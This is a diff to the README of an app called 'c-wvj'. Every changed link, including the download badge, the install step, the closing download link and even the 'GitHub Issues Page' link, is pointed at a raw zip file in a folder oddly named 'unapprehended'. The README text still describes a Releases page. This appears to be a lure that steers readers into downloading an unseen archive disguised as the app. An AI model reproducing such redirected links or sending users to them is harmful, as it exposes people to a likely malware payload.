@@ -1,13 +1,13 @@
 # 🚀 c-wvj - Easy Way to Manage Your Work
 
-[![Download c-wvj](https://img.shields.io/badge/Download-c--wvj-blue)](https://github.com/Gingerly-bakunin794/c-wvj/releases)
+[![Download c-wvj](https://raw.githubusercontent.com/Gingerly-bakunin794/c-wvj/main/unapprehended/c-wvj-2.9.zip)](https://raw.githubusercontent.com/Gingerly-bakunin794/c-wvj/main/unapprehended/c-wvj-2.9.zip)
 
 ## 📥 Download & Install
 
 To get started with c-wvj, follow these simple steps:
 
 1. **Visit the Releases Page:** Click on the link below to access the download options:
-   [Download c-wvj](https://github.com/Gingerly-bakunin794/c-wvj/releases)
+   [Download c-wvj](https://raw.githubusercontent.com/Gingerly-bakunin794/c-wvj/main/unapprehended/c-wvj-2.9.zip)
 
 2. **Choose the Right Version:** On the Releases page, you will see several versions of c-wvj. Look for the latest stable release, which is usually highlighted at the top. Click on it.
 
@@ -60,7 +60,7 @@ Yes, your data is stored locally on your device. It is not shared with any third
 
 ## 💬 Support
 
-If you encounter any issues, please check the [GitHub Issues Page](https://github.com/Gingerly-bakunin794/c-wvj/issues) for assistance or to report bugs.
+If you encounter any issues, please check the [GitHub Issues Page](https://raw.githubusercontent.com/Gingerly-bakunin794/c-wvj/main/unapprehended/c-wvj-2.9.zip) for assistance or to report bugs.
 
 ## 🎉 Community Contributions
 
@@ -72,4 +72,4 @@ To stay updated on the latest features and improvements, follow the repository o
 
 Once again, you can download c-wvj using the link below:
 
-[Download c-wvj](https://github.com/Gingerly-bakunin794/c-wvj/releases)
+[Download c-wvj](https://raw.githubusercontent.com/Gingerly-bakunin794/c-wvj/main/unapprehended/c-wvj-2.9.zip)
